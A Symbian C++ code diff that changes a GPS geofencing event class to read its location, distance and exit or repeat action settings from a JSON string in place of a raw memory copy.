@@ -9,6 +9,7 @@
  */
 
 #include "EventLocation.h"
+#include "Json.h"
 
 // Forward declaration
 LOCAL_C double VincentFormula(double lat1, double lon1, double lat2, double lon2);
@@ -46,8 +47,57 @@ void CEventLocation::ConstructL(const TDesC8& params)
 	{
 	BaseConstructL(params);
 	iGPS = CGPSPosition::NewL(*this);
-	//iLocationParams = (TLocationStruct*) iParams.Ptr();
-	Mem::Copy(&iLocationParams,iParams.Ptr(), sizeof(iLocationParams) );
+	
+	RBuf paramsBuf;
+		
+	TInt err = paramsBuf.Create(2*params.Size());
+	if(err == KErrNone)
+		{
+		paramsBuf.Copy(params);
+		}
+	else
+		{
+		//TODO: not enough memory
+		}
+		
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//retrieve gps coordinates
+		rootObject->GetReal64L(_L("latitude"), iLocationParams.iLatOrigin );
+		rootObject->GetReal64L(_L("longitude"), iLocationParams.iLonOrigin);
+		rootObject->GetIntL(_L("distance"), iLocationParams.iConfDistance);
+		//retrieve exit action
+		if(rootObject->Find(_L("end")))
+			{
+			rootObject->GetIntL(_L("end"),iLocationParams.iExitAction);
+			}
+		else
+			iLocationParams.iExitAction = -1;
+		//retrieve repeat action
+		if(rootObject->Find(_L("repeat")))
+			{
+			rootObject->GetIntL(_L("repeat"),iLocationParams.iRepeatAction);
+			rootObject->GetIntL(_L("iter"),iLocationParams.iIter);
+			rootObject->GetIntL(_L("delay"),iLocationParams.iDelay);
+			}
+		else
+			{
+			iLocationParams.iRepeatAction = -1;
+			iLocationParams.iIter = 0;
+			iLocationParams.iDelay = 0;
+			}
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
 
 	}
 
@@ -56,7 +106,6 @@ void CEventLocation::StartEventL()
 	TBool hasGPSModule = iGPS->ReceiveData(KIntervalSec, KFixTimeOutMin);
 	}
     
-//void CEventLocation::HandleGPSPositionL(TPosition position)  // original MB
 void CEventLocation::HandleGPSPositionL(TPositionSatelliteInfo satPos)
 	{
 	TPosition position;
@@ -87,7 +136,7 @@ void CEventLocation::HandleGPSPositionL(TPositionSatelliteInfo satPos)
 			{
 			iWasInsideRadius = EFalse;
 			// Triggers the Out-Action
-			if (iLocationParams.iExitAction != 0xFFFFFFFF)
+			if (iLocationParams.iExitAction != -1)
 				{
 				SendActionTriggerToCoreL(iLocationParams.iExitAction);
 				}
